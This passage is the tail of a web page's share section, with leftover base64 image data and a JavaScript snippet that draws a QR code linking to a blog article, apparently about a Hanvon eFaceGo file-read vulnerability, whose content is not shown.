PiH80aNUhuNcesvqgO6ZePuFvIaN7XP/8EtoVAtgavcXWLq7dAXez96pBz9dXlojokLy/smdKq1EVIr7wyVXIR5hzM3Fz1jqUOcx6OOUQH7j8PebzZ1/YJebP7+r+9nf8BAAD//+2WU6oAAAAGSURBVAMA8wu/pJwC6EAAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-resourceUpload-imgDownload-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 